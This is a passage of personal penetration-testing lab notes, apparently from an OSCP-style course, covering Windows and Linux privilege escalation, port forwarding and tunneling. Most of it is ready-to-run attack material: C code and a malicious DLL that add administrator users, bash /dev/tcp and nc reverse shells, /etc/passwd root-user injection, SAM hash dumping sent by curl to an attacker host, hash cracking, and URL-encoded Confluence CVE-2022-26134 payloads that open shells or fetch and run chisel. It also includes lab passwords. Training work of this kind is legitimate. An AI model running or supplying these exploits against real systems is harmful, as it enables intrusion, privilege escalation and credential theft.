    Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" 
    Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" 
    ```
  - another member of local admin group    
    `Get-LocalGroupMember "Administrators"`
  - List the process and file path    
    `Get-Process`  `(Get-Process -Id 2552).MainModule.FileName`
- 17.1.3 Hidden in Plain view
  - Find the flag on the desktop of backupadmin
    ```
    nc 192.168.145.220 4444
    runas /user:backupadmin cmd
    Get-ChildItem -Path C:\Users\backupadmin\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
    type C:\Users\backupadmin\Desktop\flag.txt
    ```
  - Search the file system in user's directory  
    `Get-ChildItem -Path C:\Users\steve -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`  
  - Decode base64 ini file
    ```
    runas /user:richmond cmd
    Get-ChildItem -Path C:\Users\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
    type C:\Users\Public\Documents\install.ini

    Decode it [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('ewANAAoAIAAgACIAYgBvAG8AbABlAGEAbgAiADoAIAB0AHIAdQBlACwADQAKACAAIAAiAGEAZABtAGkAbgAiADoAIABmAGEAbABzAGUALAANAAoAIAAgACIAdQBzAGUAcgAiADoAI    AB7AA0ACgAgACAAIAAgACIAbgBhAG0AZQAiADoAIAAiAHIAaQBjAGgAbQBvAG4AZAAiACwADQAKACAAIAAgACAAIgBwAGEAcwBzACIAOgAgACIARwBvAHQAaABpAGMATABpAGYAZQBTAHQAeQBsAGUAMQAzADMANwAhACIADQAKACAAIAB9AA0ACgB9AA=='))
    ```
- 17.1.4 Information Goldmine PowerShell
  - Q1 obtain an interactive shell as daveadmin and find the flag  
    `evil-winrm -i 192.168.145.220 -u daveadmin -p "qwertqwertqwert123\!\!"`  
  - Q2 connect daveadmin via RDP. Use the Event Viewer to search for events recorded by Script Block Logging  
    Event Viewer-->Application and Services → Microsoft → Windows → PowerShell → Operational:  
    Click Filter Current Log and search for 4104 event  
  - Q3 connect mac via RDP. Enumerate the machine  
    ```
    Get-History
    (Get-PSReadlineOption).HistorySavePath
    type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    ```
- 17.1.5 Automated Enumeration
  - WinPEAS enumeration
    `cp /usr/share/peass/winpeas/winPEASx64.exe .`
    `python3 -m http.server 80`

    ```
    nc 192.168.145.220 4444
    powershell
    iwr -uri http://192.168.45.221/winPEASx64.exe -Outfile winPEAS.exe
    .\winpeas.exe 
    ```
  - Seatbelt enumeration
    Download [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe)  
    `python3 -m http.server 80`
    ```
    nc 192.168.145.220 4444
    powershell
    iwr -uri http://192.168.45.221/Seatbelt.exe -Outfile Seatbelt.exe
    .\Seatbelt.exe -group=all
    ```
- 17.2.1 Service Binary Hijacking
  - service binary mysql replace  
    Kali machine create binary file to add new user 'dave2' as 'administrator group' > cross-compile > start web server    
    ```
    nano adduser.c

    #include <stdlib.h>

    int main ()
    {
     int i;

     i = system ("net user dave2 password123! /add");
     i = system ("net localgroup administrators dave2 /add");

    return 0;
    }

    x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
    python3 -m http.server 80
    ```
    RDP to target > check running services > check permission of mysqld.exe > download kali adduser.exe to local > backup local mysqld.exe > move downloaded adduser.exe to replace mysqld.exe  > stop mysql > shut down machine > check new user created > run as new user
    ```
    Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}  //look for non C:\Windows\System32 directory service
    icacls "C:\xampp\mysql\bin\mysqld.exe"

    iwr -uri http://192.168.45.221/adduser.exe -Outfile adduser.exe
    move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
    move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

    net stop mysql
    shutdown /r /t 0
    Get-LocalGroupMember administrators

    run powerShell as admin
    runas /user:dave2 cmd
    type C:\Users\daveadmin\Desktop\flag.txt
    ```
  - PowerUp.ps1 to identify a service to modify  
    Kali start PowerUp.ps1 (post exploitation tool)  
    ```
    cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
    python3 -m http.server 80
    ```

    Target replace BackupMonitor.exe with adduser.exe
    ```
    iwr -uri http://192.168.45.221/PowerUp.ps1 -Outfile PowerUp.ps1
    powershell -ep bypass
    . .\PowerUp.ps1
    Get-ModifiableServiceFile

    Output>BackupMonitor

    iwr -uri http://192.168.45.221/adduser.exe -Outfile adduser.exe
    move C:\BackupMonitor\BackupMonitor.exe BackupMonitor.exe
    move .\adduser.exe C:\BackupMonitor\BackupMonitor.exe

    net stop BackupMonitor  
    shutdown /r /t 0

    rdp as 'dave2'
    run powerShell as admin
    type C:\Users\roy\Desktop\flag.txt
    ```
- 17.2.2 DLL Hijacking
  - RDP to target and look for vulnerable DLL  
    ```
    xfreerdp3 /u:steve /p:securityIsNotAnOption++++++ /v:192.168.185.220 /cert:ignore /drive:share,/home/kali/share  
    Get-CimInstance Win32_Service -Filter "Name='mysql'" | Select-Object Name, StartName, PathName //File Zilla  
    ```
  - Use Procmon to filter events to look for malicious dll  
    run C:\tools\Procmon\Procmon64.exe (password:admin123admin123! for backupadmin)  
    - Filter by  process name: xxx.exe  
    - Filter by operation is 'CreateFile', Result is 'Name not found', Path contains '.dll'  
  - Kali create malicious dll to add new user 'dave3'  
    ```
    nano TextShaping.cpp

    #include <stdlib.h>
	#include <windows.h>
	
	BOOL APIENTRY DllMain(
	HANDLE hModule,// Handle to DLL module
	DWORD ul_reason_for_call,// Reason for calling function
	LPVOID lpReserved ) // Reserved
	{
	    switch ( ul_reason_for_call )
	    {
	        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
	        int i;
	  	    i = system ("net user dave3 password123! /add");
	  	    i = system ("net localgroup administrators dave3 /add");
	        break;
	        case DLL_THREAD_ATTACH: // A process is creating a new thread.
	        break;
	        case DLL_THREAD_DETACH: // A thread exits normally.
	        break;
	        case DLL_PROCESS_DETACH: // A process unloads the DLL.
	        break;
	    }
	    return TRUE;
	}

    x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
    python3 -m http.server 80
    ```
  - wait high privilege user login and trigger the dll  
  - check new user created `net user`  
- 17.2.3 Unquoted Service Paths
  - PowerUp to identify unquoted service "GammaService"
    ```
    iwr http://192.168.45.221/PowerUp.ps1 -Outfile PowerUp.ps1
    powershell -ep bypass
    . .\PowerUp.ps1
    Get-UnquotedService

    iwr -uri http://192.168.45.221/adduser.exe -Outfile Current.exe
    copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'

    Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
    Restart-Service GammaService
    net user
    net localgroup administrators
    ```
  - use wmic to identify unquoted service "ReynhSurveillance"  
    ```
    C:\Users\damian> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
    Start-Service ReynhSurveillance
    Stop-Service ReynhSurveillance

    output> C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe

    Windows will try these in this order:
    C:\Enterprise.exe
    C:\Enterprise Software\Monitoring.exe
    C:\Enterprise Software\Monitoring Solution\Surveillance.exe
    C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe ← intended

    iwr -uri http://192.168.45.221/adduser.exe -Outfile ReynhSurveillance.exe
    copy .\ReynhSurveillance.exe 'C:\Enterprise Software\Monitoring Solution\Surveillance.exe'

    Restart-Service ReynhSurveillance
    net user
    net localgroup administrators
    ```
- 17.3.1 Scheduled Tasks
  - Exploit task "CacheCleanup"  
    ```
    schtasks /query /fo LIST /v
    icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe

    iwr -Uri http://192.168.45.221/adduser.exe -Outfile BackendCacheCleanup.exe
    move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
    move .\BackendCacheCleanup.exe .\Pictures\
    ```
  - Enumerate scheduled tasks  
    ```
    schtasks /query /fo LIST /v
    
    iwr -Uri http://192.168.45.221/adduser.exe -Outfile VoiceActivation.exe
    move .\Searches\VoiceActivation.exe VoiceActivation.exe.bak
    move .\VoiceActivation.exe .\Searches\
    ```
- 17.3.2 Using Exploits
  - Exploit CVE-2023-29360 to elevate privilege to NT AUTHORITY\SYSTEM
    `xfreerdp3 /u:steve /p:securityIsNotAnOption++++++ /v:192.168.185.220 /cert:ignore /drive:share,/home/kali/share`  
    `.\CVE-2023-29360.exe`  
  - Use SigmaPotato o obtain shell
    ```
    #kali
    wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
    python3 -m http.server 80

    nc 192.168.185.220 4444
    
    #target
    whoami /priv
    C:\Users\dave> powershell
    iwr -uri http://192.168.45.221/SigmaPotato.exe -OutFile SigmaPotato.exe
    .\SigmaPotato "net user dave4 lab /add"
    .\SigmaPotato "net localgroup Administrators dave4 /add"
    net user
    xfreerdp3 /u:dave4 /p:lab +clipboard /v:192.168.185.220 /cert:ignore /drive:share,/home/kali/share 
    ```
  - **Capstone** Lab for pivoting users via reverse shell and hashes extract
    -  search sensitive info > notes.txt  
       `Get-ChildItem -Path C:\Users\diana\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`  
    -  found credentials for Alex  
       who's responsible for Jenkins? ask Alex after holiday  
       Default password for new resets will be WelcomeToWinter0121  
       `xfreerdp3 /u:alex /p:WelcomeToWinter0121 /v:192.168.185.222 /cert:ignore /drive:share,/home/kali/share`
    -  Enumerate running services  
       `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`  
       output: C:\Services\EnterpriseService.exe  
    -  Explore C:\Services\ directory and Found a log file
       [00:00:00.000] (b8c) WARN   Couldn't load EnterpriseServiceOptional.dll, only using basic features  
    -  Try replace the "EnterpriseServiceOptional.dll" > not working  
       `x86_64-w64-mingw32-gcc EnterpriseServiceOptional.cpp --shared -o EnterpriseServiceOptional.dll`  
       `iwr -uri http://192.168.45.221/EnterpriseServiceOptional.dll -OutFile 'C:\Services\EnterpriseServiceOptional.dll'`  
    -  Try reverse shell > shell obtained  
       `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=4444 -f dll -o reverse.dll`   
       `iwr -uri http://192.168.45.221/reverse.dll -OutFile 'C:\Services\EnterpriseServiceOptional.dll'`  
       `Restart-Service EnterpriseService`  
    -  Powershell cannot be used in reverse shell  
    -  `whoami /priv` enterpriseuser: (SeImpersonatePrivilege, SeBackupPrivilege)
    -  Not working for SigmaPotato -  try SeBackupPrivilege with SAM dump
    -  Extract hashes from SAM and SYSTEM  
       `reg save HKLM\SAM sam` `reg save HKLM\SYSTEM system`  
    -  transfer files from victim reverse shell to kali  
       ```
       #kali
       mkdir -p /home/kali/uploads
       cd /home/kali/uploads
       pipx install uploadserver
       pipx run uploadserver --directory /home/kali/uploads 8008

       #target
       curl -X POST http://192.168.45.221:8000/uploads -F "files=@C:\Users\enterpriseuser\sam"
       curl -X POST http://192.168.45.221:8000/uploads -F "files=@C:\Users\enterpriseuser\system"
       ```
    -  Extract the hashes using secretsdump.py  
       ```
       pipx install impacket
       secretsdump.py -sam /home/kali/uploads/sam -system /home/kali/uploads/system LOCAL
       enterpriseadmin:1001:aad3b435b51404eeaad3b435b51404ee:d94267c350fc02154f2aff04d384b354:::

       echo "d94267c350fc02154f2aff04d384b354" > hash.txt
       hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
       ```
    -  RDP enterpriseadmin `xfreerdp3 /u:enterpriseadmin /p:S3cureStore /v:192.168.185.222 /cert:ignore /drive:share,/home/kali/share`  

### Linux Privilege Escalation  
- 18.1.2 Manual Enumeration
  ssh joe@192.168.185.214
  - Q1 Linux distribution codename (VERSION_CODENAME=buster)
    ```
    cat /etc/issue
    cat /etc/os-release
    uname -a
    ```
  - Q2  crontab parameter is needed to list every cron job
    `crontab -l //current user`  
    `sudo crontab -l //root`  
    ```
  - Q3 inherited UID called that allows a given binary to be executed with root permissions even when launched by a lower-privileged user: setuid
  - Q4 inside one of the SUID binaries available on the system
    `find / -perm -u=s -type f 2>/dev/null`
    `strings /usr/bin/passwd_flag | grep "OS{"`  
- 18.1.3 Automated Enumeration
  ```
  ==Kali===
  wget https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
  tar -xzf unix-privesc-check-1.4.tar.gz
  
  ==Target==
  scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.185.214:/home/joe
  ./unix-privesc-check standard > output.txt
  Look for "World write is set for" in output.txt
 
- 18.2.1 Inspecting User Trails
  - List sudoer capabilities for a given user  
    `sudo -l`  
    ```
     User joe may run the following commands on debian-privesc:
	    (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
    ```
  - Discover credential and brute force with wordlist  
    `env` > SCRIPT_CREDENTIALS=lab  
    `crunch 6 6 -t Lab%%% > wordlist`  
    `hydra -l eve -P wordlist 192.168.185.214 -t 4 ssh -V` > Lab123  
    `ssh eve@192.168.185.214` `sudo -i` `whoami`  
- 18.2.2 Inspecting Service Footprints
  - inspect the output of the ps command  
    `watch -n 1 "ps -aux | grep pass"`  
  - look at the list of running processes  
    `ps aux | grep flag`
- 18.3.1 Abusing cron jobs
  - Which log file holds information about cron job activities?  
    `grep "CRON" /var/log/syslog`  
  - look for misconfigured cron job "-rwxrwxrw-", obtain root shell  
    ```
    ls -lah /tmp/this_is_fine.sh 
    nc -lnvp 4444
    cd /tmp/
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1234 >/tmp/f" >> this_is_fine.sh //not working
    echo 'bash -i >& /dev/tcp/192.168.45.221/4444 0>&1' >> this_is_fine.sh //working
    ```
- 18.3.2 Abusing password authentication
  - identify hash algo of password
    ```
    cat /etc/shadow
    https://en.wikipedia.org/wiki/Crypt_(C)
    $1: MD5
    $5: SHA-256
    $6: SHA-512
    ```
  - elevate privilege
    ```
    openssl passwd w00t
    echo "root2:N5OdbV0I42eXc:0:0:root:/root:/bin/bash" >> /etc/passwd
    su root2
    ```
- 18.4.1 Abusing setuid binaries and capabilities
  https://gtfobins.github.io/gtfobins/gdb/
  `/usr/sbin/getcap -r / 2>/dev/null`  
  - Q1 Search for misconfigured capabilities "perl"
    output: /usr/bin/perl = cap_setuid+ep  
    `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
  - Q2 Search for misconfigured capabilities "gdb"
    output: /usr/bin/gdb = cap_setuid+ep  
    `gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit`
- 18.4.2 Abusing sudo
  scan:  sudo -l
  [gtfobins](https://gtfobins.github.io/gtfobins/tcpdump/#sudo)
  - Q1 abuse sudo: apt-get  
    `sudo apt-get changelog apt`  
    `!/bin/sh`  
  - Q2 abuse sudo: gcc
    `/usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/gcc`
- 18.4.3 Exploiting Kernel Vulnerabilities
  - Manual enumeration - SUID 
    - enumerate the version of system  > Linux ubuntu-privesc 4.4.0-116-generic
      ```
      cat /etc/issue > Ubuntu 16.04.4 
      cat /etc/os-release > Ubuntu 16.04.4
      uname -a
      ```
    - check SUID files , look for uncommon or custom SUID binaries > /usr/bin/pkexec
      `find / -perm -u=s -type f 2>/dev/null`  
    - google "Pkexec" Local Privilege Escalation
      ```
      Download the pre-compile code https://github.com/ly4k/PwnKit/blob/main/PwnKit
      scp PwnKit joe@192.168.216.216:
      chmod +x PwnKit
      ./PwnKit
      ```
  - insecure file permission - cron jobs
    - list all crons jobs and for current user, look for daily, writable jobs, Is any file in /etc/cron.daily/ writable by you? (rw)
      `ls -lah /etc/cron*` `crontab -l`  
    - output:  cat /etc/cron.hourly/archiver
      ```
      #!/bin/sh
      # I wanted this to run more often so moved to it to my personal crontab so I could run it every minute
      /var/archives/archive.sh

      ls -lah /var/archives/archive.sh (rw) access 
      ```
    - add reverse shell to existing writable .sh
      ```
      nano archive.sh
      bash -i >& /dev/tcp/192.168.45.182/4444 0>&1
      ```
    - When a binary has the setuid bit set, it runs as the owner of the file, regardless of who executes it.
      `echo "chmod u+s /bin/bash" >> /var/archives/archive.sh`  
  - abuse password authentication
    - list all writable files > /etc/passwd  
      `find / -writable -type f 2>/dev/null`  
    - write new user 'root2' to /etc/passwd  
      ```
      openssl passwd w00t
      echo "root2:EdGi9pT50v0Nw:0:0:root:/root:/bin/bash" >> /etc/passwd
      su root2
      id
      ```
  - SUID binaries [bin/mount](https://gtfobins.github.io/gtfobins/mount/)
    - listing the SUID binaries > /bin/mount  
      `find / -perm -u=s -type f 2>/dev/null`  
    - Exploit mount > euid=0(root)  
      `mount -o bind /bin/sh /bin/mount` `id`  

### Port redirection and SSH Tunneling  
- Port forward with linux tools (Kali > confluence > db)  
  - nmap scan open ports on CONFLUENCE01 > 22, 80, 8090
  - set netcat listener + gain reverse shell to confluence server)  
    `nc -nvlp 4444`  
    `curl http://<CONFLUENCE01>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/<KALI>/4444%200%3E%261%27%29.start%28%29%22%29%7D/`
  - get credentials on atlassian to access DB  
    `cat /var/atlassian/application-data/confluence/confluence.cfg.xml`  
  - open port 2345 (from confluence to DB)  
    `confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.124.215:5432`  
  - connect to DB through port forward 2345  
    `psql -h 192.168.124.63 -p 2345 -U postgres`  
  - open port 2222 (from confluence to DB)  
    `confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.124.215:22`
  - connect to DB through port forward 2222  
    `ssh database_admin@192.168.124.63 -p2222`  
- SSH Tunneling
  - SSH local port forwarding
    - Kali 192.168.45.250 to confluence 192.168.114.63 to DB 10.4.114.215 to HR 172.16.114.217 
    - Enable Python's pty module after getting a shell on Confluence.
      `confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'`
    - Open port forward 4242 on confluence
      `ssh -N -L 0.0.0.0:4242:172.16.114.217:4242 database_admin@10.4.114.215`  
    - Check if the port open now
      `nc -zv 192.168.114.63 4242`  
    - Download ssh_local_client via browser.
      `wget http://192.168.114.63:8090/exercises/ssh_local_client`
    - Connect to HR server via port 4242
      `./ssh_local_client -i 192.168.114.63 -p 4242`
  - SSH dynamic port forwarding
    - Q1: nmap HR server
      `sudo proxychains nmap -vvv -sT -p 4870-4880 -Pn 172.16.114.217`
    - Q2: connect to HR server for the found port 4872
      ```
      #set dynamic port forward 9999
      ssh -N -D 0.0.0.0:9999 database_admin@10.4.114.215
      
      #edit /etc/proxychains4.conf
      socks5 192.168.114.63 9999

      #connect to HRSHARES port 4872 via proxychains
      proxychains ./ssh_dynamic_client -i 172.16.114.217 -p 4872
      ```
  - SSH remote port forwarding
      ```
      python3 -c 'import pty; pty.spawn("/bin/sh")'
      ssh -N -R 127.0.0.1:4444:10.4.114.215:4444 kali@192.168.45.250
      ./ssh_remote_client -i 192.168.114.63 -p 4444
      ```
  - SSH remote dynamic port forwarding  
    ```
    python3 -c 'import pty; pty.spawn("/bin/sh")'
    ssh -N -R 9998 kali@192.168.45.233

    sudo nano /etc/proxychains4.conf
    #socks5 127.0.0.1 9998

    sudo proxychains nmap -vvv -sT -p 9050-9100 -Pn 10.4.133.64 > found port 9062

    proxychains ./ssh_remote_dynamic_client -i 10.4.133.64 -p 9062
    ```
- Port forward with window tools ssh.exe
  - Kali: 192.168.45.233, MULTISERVER03: 192.168.202.64, DB:10.4.202.215
  - RDP to MULTISERVER03 + use openSSH to create a port forward to reach 4141 on PGDATABASE01 from Kali
  ```
  kali@kali:~$ sudo systemctl start ssh
  kali@kali:~$ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.202.64  -->MULTISERVER03

  #target
  C:\Users\rdp_admin>where ssh -->command prompt
  ssh.exe -V
  C:\Users\rdp_admin>ssh -N -R 4141 kali@192.168.45.231 -->Kali

  #kali
  nano etc/proxychains4.conf
  socks5 127.0.0.1 4141

  proxychains ./ssh_exe_exercise_client.bin -i 10.4.202.215 -->DB
  ```
- Port forward with window tools Plink
  - MULTISERVER03: 192.168.202.64
  - RDP to MULTISERVER03 by using [Plink](https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe)
  ```
  #kali
  sudo systemctl start ssh
  sudo systemctl start apache2
  find / -name nc.exe 2>/dev/null 
  sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/

  #web
  browse to pre-compromised http://192.168.202.64/umbraco/forms.aspx web shell -->MULTISERVER03
  powershell wget -Uri http://192.168.45.231/nc.exe -OutFile C:\Windows\Temp\nc.exe  --> execute

  #kali
  kali@kali:~$ nc -nvlp 4446

  #web
  C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.231 4446 -->Kali

  #rs
  c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.45.231/plink.exe -OutFile C:\Windows\Temp\plink.exe
  c:\windows\system32\inetsrv>cd C:\Windows\Temp
  C:\Windows\Temp>plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.231  -->Kali

  OR
  taskkill /f /t /im plink.exe
  cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.231

  #kali
  ss -ntplu
  kali@kali:~$ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
  ```
- Port forward with window tools Netsh
  - MULTISERVER03  192.168.120.64, PGDATABASE01 10.4.120.215  
  - Create a port forward with Netsh, in order to SSH into PGDATABASE01 from the Kali machine  
    ```
    #kali RDP to MULTISERVER03
    kali@kali:~$ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.120.64  -->MULTISERVER03 

    #target poke a hole 2222 in MULTISERVER03 (run cmd as administrator)
    C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.120.64 connectport=22 connectaddress=10.4.120.215   -->MULTISERVER03 , DB  
    C:\Windows\system32>netstat -anp TCP | find "2222"
    C:\Windows\system32>netsh interface portproxy show all
    C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.120.64 localport=2222 action=allow  ->MULTISERVER03 

    $kali login to DB
    kali@kali:~$ ssh database_admin@192.168.120.64 -p2222  -->MULTISERVER03 
    ```
  - Create a port forward on MULTISERVER03 that allows you to run this binary against port 4545 on PGDATABASE01
    ```
    kali@kali:~$ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.120.64  -->MULTISERVER03 

    #target poke a hole 2222 in MULTISERVER03 (run cmd as administrator)
    C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=4545 listenaddress=192.168.120.64 connectport=4545 connectaddress=10.4.120.215   -->MULTISERVER03 , DB  
    C:\Windows\system32>netstat -anp TCP | find "4545"
    C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_4545" protocol=TCP dir=in localip=192.168.120.64 localport=4545 action=allow  ->MULTISERVER03 

    $kali login to DB
    kali@kali:~$  sudo ./netsh_exercise_client -i 192.168.120.64 -p 4545 ->MULTISERVER03
    ```

### Tunneling through deep packet inspectation  
- HTTP tunneling with chisel  
  - Set up Chisel as a reverse SOCKS proxy. SSH into PGDATABASE01
    ```
    #Scenario Summary
	Victim: CONFLUENCE01 with only TCP/8090 allowed inbound
	DPI firewall: Only allows outbound HTTP (port 80)
	No reverse shell, no socat/ncat, no SSH
	Only curl or wget usable from victim
	You have RCE via Confluence using Nashorn Java injection
    ```
    - Download Chisel v1.10.1 and start apache  
      ```
      wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
      gunzip chisel_1.10.1_linux_amd64.gz
      chmod +x chisel_1.10.1_linux_amd64
      sudo mv chisel_1.10.1_linux_amd64 /var/www/html/chisel
      
      sudo systemctl start apache2
      ```
    - Start **Chisel Server** in reverse mode on Kali (port 8080)  
      `chisel server --port 8080 --reverse`
    - Exploit Confluence rce to wget Chisel  
      ```
      curl "http://<CONFLUENCE>:8090/\${new javax.script.ScriptEngineManager().getEngineByName('nashorn').eval('new java.lang.ProcessBuilder().command(\"bash\",\"-c\",\"wget http://<KALI>/chisel -O /tmp/chisel && chmod +x /tmp/chisel\").start()')}"

      curl http://192.168.126.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.208/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/  
      ```
    - Confirm via Apache access logs > GET /chisel HTTP/1.1  
      `tail -f /var/log/apache2/access.log`
    - Exploit to run Chisel client R:socks  
      ```
      curl "http://<CONFLUENCE>:8090/\${new javax.script.ScriptEngineManager().getEngineByName('nashorn').eval('new java.lang.ProcessBuilder().command(\"bash\",\"-c\",\"/tmp/chisel client <KALI>:8080 R:socks\").start()')}"

      curl http://192.168.126.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.208:8080%20R:socks%27%29.start%28%29%22%29%7D/
      ```
    - Confirm tunnel via ss or tcpdump  
      `ss -ntplu | grep 8080` `sudo tcpdump -nvvvXi tun0 tcp port 8080` 
    - SSH with proxy via Chisel SOCKS tunnel (PASSWORD:sqlpass123)
      ```
      sudo apt install ncat
      ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.126.215
      ```
  - Set up a port forward using Chisel that allows you to run the binary you downloaded against port 8008 on PGDATABASE01  
    - Start Chisel Server in reverse mode on Kali (port 8080)  
      `chisel server --port 8080 --reverse`
    - sudo nano /etc/proxychains4.conf  
      `socks5 127.0.0.1 1080`
    - Inject payload to download Chisel on CONFLUENCE01  
      `curl http://192.168.126.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.208/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/`
    - Exploit to run Chisel client R:socks port 8080  
      `curl http://192.168.126.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.208:8080%20R:socks%27%29.start%28%29%22%29%7D/`
    - chisel terminal > proxy#R:127.0.0.1:1080=>socks: Listening  
    - connect to DB port 8008 through a SOCKS proxy using proxychains.  
      `proxychains ./chisel_exercise_client -i 10.4.126.215 -p 8008`
- DNS tunnelling fundamental
  - From CONFLUENCE01 or PGDATABASE01, make a TXT record request for give-me.cat-facts.internal, using MULTISERVER03 as the DNS resolver
  - `nc -nvlp 4444`
  - get reserve shell from confluence CVE-2022-26134. change confluence server and kali ip
    `curl http://192.168.164.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/`
  - reverse shell TTY to PGDATABASE01 and login as database_admin
    ```
    confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
    ssh database_admin@10.4.164.215 pass: sqlpass123
    ```
  - The TXT record response from give-me.cat-facts.internal
    `database_admin@pgdatabase01:~$ nslookup -type=txt give-me.cat-facts.internal`
- DNS tunneling with dnscat2  
  ```
  MULTISERVER03  192.168.164.64
  FELINEAUTHORITY 192.168.164.7
  PGDATABASE01 10.4.164.215
  CONFLUENCE01 192.168.164.63
  HRSHARES 172.16.164.217
  ```
  - set up the dnscat2 server on FELINEAUTHORITY, and execute the dnscat2 client on PGDATABASE01  
  - get reserve shell from confluence CVE-2022-26134. change confluence server and kali ip  
    ```
    nc -nvlp 4444
    curl http://192.168.164.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/

    confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
    ssh database_admin@10.4.164.215 pass: sqlpass123
    ```
  - another shell of FELINEAUTHORITY, start dnscat2-server > New window created: 1  
